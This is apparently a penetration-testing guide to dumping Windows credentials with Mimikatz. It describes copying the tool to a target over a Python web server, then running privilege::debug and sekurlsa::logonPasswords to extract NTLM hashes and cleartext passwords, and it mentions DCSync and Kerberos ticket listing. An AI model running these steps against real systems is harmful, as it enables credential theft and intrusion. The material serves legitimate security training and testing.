## Mimikatz Overview

Mimikatz is a versatile tool that extends beyond just credential dumping. Here’s a brief overview of some of its core functionalities:

- **privilege::debug**: Allows Mimikatz to escalate its access to read sensitive information.
- **sekurlsa::logonPasswords**: Dumps credentials, including NTLM hashes and sometimes cleartext passwords.
- **lsadump::dcsync**: A powerful method to remotely simulate Domain Controller synchronization and dump domain hashes.
- **kerberos::list**: Lists Kerberos tickets, which can be exploited using techniques like pass-the-ticket.

**Note**: Mimikatz is a dual-use tool, commonly used by both attackers and security professionals. Its capabilities can assist in penetration testing, incident response, and research on credential theft methods.

# Credential Dumping with Mimikatz

Mimikatz is a well-known tool used for extracting credentials from Windows systems. This guide walks through using Mimikatz to perform credential dumping, focusing on gathering NTLM hashes or even cleartext passwords from logged-in users.

### Prerequisites

- Access to a Windows system with Administrator privileges.
- A copy of Mimikatz ready for transfer to the target machine.

---

### Step 1: Transfer Mimikatz to the Target System

First, transfer Mimikatz to the Windows host. For example, you can spin up a simple Python web server on your machine and download it onto the target.

Run the following command on your machine:
`python3 -m http.server 80`

![Pasted image 20250224173153](https://github.com/user-attachments/assets/21c28bc5-0dd5-4dea-943c-d7c9082ca2f1)


### Step 2: Open Mimikatz in an Administrative Command Prompt

On the Windows host:

1. Open an **Administrative Command Prompt**.
2. Navigate to the directory where Mimikatz was downloaded:
    
    `cd C:\Users\j.smith\Downloads`
3. Run Mimikatz:
    
    `mimikatz.exe`

![Pasted image 20250224173519](https://github.com/user-attachments/assets/e1f2f044-4188-409b-8919-3a000500a4c4)


### Step 3: Set Privilege to Debug

Before dumping credentials, Mimikatz requires **debug privileges**. Run the following command:

`privilege::debug`

![Pasted image 20250224173640](https://github.com/user-attachments/assets/5c14bd73-2d0b-4020-b547-7e4f9a8e1bae)


### Step 4: Explore Sekurlsa Module

The `sekurlsa` module is used for extracting credentials from memory. You can view available commands using:

`sekurlsa::`

![Pasted image 20250224173736](https://github.com/user-attachments/assets/2614f23c-b568-4580-9745-c64ab22ef04a)


Many of these functionalities overlap with other tools such as `secretsdump.py`.

### Step 5: Dump Credentials with `logonPasswords`

Finally, to dump credentials, including NTLM hashes, use:

`sekurlsa::logonPasswords`

This will list credentials for users currently logged in. Occasionally, Mimikatz may also reveal cleartext passwords, so it's worth running this command even if you’re just expecting hashes.

